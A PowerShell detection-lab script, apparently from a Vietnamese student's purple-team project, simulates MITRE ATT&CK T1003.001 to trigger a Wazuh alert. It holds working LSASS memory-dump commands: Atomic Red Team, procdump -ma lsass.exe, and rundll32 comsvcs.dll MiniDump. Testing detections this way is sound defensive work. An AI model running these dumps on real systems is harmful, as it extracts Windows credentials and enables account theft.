<#
.SYNOPSIS
    Kịch bản kiểm thử T1003.001 - Credential Access: OS Credential Dumping: LSASS Memory
.DESCRIPTION
    Đồ án: Purple Team Detection Engineering Lab
    Sinh viên: Nguyễn Minh Trí (MSSV: 92510340016)
    Kỹ thuật: MITRE ATT&CK T1003.001
    Quy tắc Wazuh đích: Rule 100002 (Level 12)
#>

Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host "[*] THỰC THI MÔ PHỎNG T1003.001 - LSASS MEMORY DUMP" -ForegroundColor Cyan
Write-Host "==========================================================" -ForegroundColor Cyan

# Kiểm tra quyền Administrator (Bắt buộc để dump LSASS)
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Warning "[-] Chú ý: Cần quyền Administrator để truy cập bộ nhớ tiến trình lsass.exe!"
}

# Cách 1: Sử dụng Atomic Red Team
if (Get-Command Invoke-AtomicTest -ErrorAction SilentlyContinue) {
    Write-Host "[+] Chạy Atomic Red Team Test Case 1 cho T1003.001..." -ForegroundColor Green
    Invoke-AtomicTest T1003.001 -TestNumbers 1
} else {
    # Cách 2: Sử dụng Procdump trực tiếp
    Write-Host "[+] Sử dụng Procdump để dump bộ nhớ lsass.exe..." -ForegroundColor Yellow
    $procdump = ".\procdump.exe"
    if (-not (Test-Path $procdump)) {
        $procdump = "C:\Windows\Temp\procdump.exe"
    }
    
    if (Test-Path $procdump) {
        & $procdump -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp
    } else {
        # Fallback PowerShell mini-dump qua comsvcs.dll
        Write-Host "[+] Fallback: Mô phỏng dump LSASS bằng comsvcs.dll..." -ForegroundColor Gray
        $lsassPid = (Get-Process lsass).Id
        rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPid C:\Windows\Temp\lsass.dmp full
    }
}

Write-Host "`n[✓] Đã kích hoạt dump LSASS! Vui lòng kiểm tra cảnh báo Rule 100002 trên Wazuh Dashboard." -ForegroundColor Green
